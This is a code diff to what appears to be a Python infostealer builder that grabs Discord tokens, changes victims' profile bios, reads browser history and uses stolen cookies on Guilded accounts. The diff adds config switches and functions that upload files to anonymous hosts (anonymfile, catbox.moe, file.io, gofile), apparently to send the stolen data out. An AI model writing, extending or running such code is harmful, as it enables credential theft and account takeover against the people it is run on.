@@ -30,6 +30,13 @@ hidewindow = '%Hide%'
 changebio = '%ChangeBio%'
 biotext = '%Text%'
 
+# WEBSITE UPLOAD 
+
+Anonymousfile = '%AnonymousYesOrNo%'
+Gofile = '%GoFileYesOrNo%'
+fileio = '%FileIOYesOrNo%'
+catbox = '%CatBoxMoeYesOrNo%'
+
 if Startup == False:
     StartupMessage = 'Adding to startup disabled in the config'
 else:
@@ -281,7 +288,6 @@ def fakegen():
                 continue
             essay = int(essay)
 
-            # Create a thread to run the generate_codes function
             thread = threading.Thread(target=generate_codes, args=(essay,))
             thread.start()
 
@@ -1262,7 +1268,7 @@ def uploadTokq(Tokq, path):
     if changebio == True:
         change_about_me(Tokq)
 
-def upload_file(path):
+def gofileupload(path):
     try:
         return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
     except:
@@ -1274,7 +1280,49 @@ def upload_file(path):
         except:return False
     
     
+def anonymfileupload(path):
+    try:
+        with open(path, 'rb') as file:
+            response = requests.post('https://anonymfile.com/api/v1/upload', files={'file': file})
+        
+        result_json = response.json()
+        
+        if response.status_code == 200 and result_json.get("status") is True:
+            file_url = result_json["data"]["file"]["url"]["full"]
+            return file_url
+        else:
+            error_message = result_json.get("errors", {}).get("file", ["Unknown error"])
+            return False
+    except Exception as e:
+        return False
 
+def catboxmoeupload(path):
+    try:
+        with open(path, 'rb') as file:
+            response = requests.post('https://catbox.moe/user/api.php', files={'file': file})
+        return response.text.strip()
+    except Exception as e:
+        return False
+
+
+def fileioupload(path):
+    try:
+        with open(path, 'rb') as file:
+            response = requests.post('https://file.io/', files={'file': file})
+        return response.json()["link"]
+    except Exception as e:
+        return False
+
+def upload_file(path):
+    if Anonymousfile == True:
+        anonymfileupload(path)
+    elif fileio == True:
+        fileioupload(path)
+    elif Gofile == True:
+        gofileupload(path)
+    elif catbox == True:
+        catboxmoeupload(path)
+        
 def find_history_file(browser_name, path_template):
     if os.name == "nt":
         data_path = os.path.expanduser(path_template.format(browser_name))
@@ -2356,7 +2404,6 @@ def guilded(cookie):
             social_links = response["user"]['socialLinks']
             social_links_info = []
 
-            # Iterate through social links and store information in a list
             for link in social_links:
                 name = link.get('handle', '')
                 websitename = link.get('type', 'Cannot get the website')
